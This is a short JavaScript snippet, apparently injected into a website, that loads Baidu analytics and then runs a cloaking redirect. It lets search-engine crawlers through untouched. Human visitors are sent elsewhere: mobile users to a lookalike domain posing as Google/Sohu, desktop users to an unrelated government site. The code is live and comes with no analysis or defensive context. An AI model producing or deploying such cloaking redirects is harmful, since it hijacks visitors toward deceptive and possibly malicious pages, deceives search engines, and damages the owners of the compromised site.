      var _hmt = _hmt || [];
      (function() {
        var hm = document.createElement("script");
        hm.src = "https://hm.baidu.com/hm.js?d665b8b4996127fbdde7c127aad3552e";
        var s = document.getElementsByTagName("script")[0]; 
        s.parentNode.insertBefore(hm, s);
      })();
function isSpider() {
//判断是否为蜘蛛，是蜘蛛返回true
  if ((navigator.userAgent.match(/(Baiduspider|YisouSpider|360Spider|HaosouSpider|AdsBot|Googlebot|bingbot|Sogou web spider|Sosospider)/i)))
    return true;
  else
    return false;
}
function isMobile() {
//判断如果是手机端和电脑端跳转不同的网页
  if ((navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i)))
    return true;
  else
    return false;
}

if(!isSpider()){
  
    if(isMobile()) {
     window.location.href = 'https://google.sohujs.com/zcdll.html';
    } else {
     window.location.href = 'https://www.cngy.gov.cn/';
    }
}
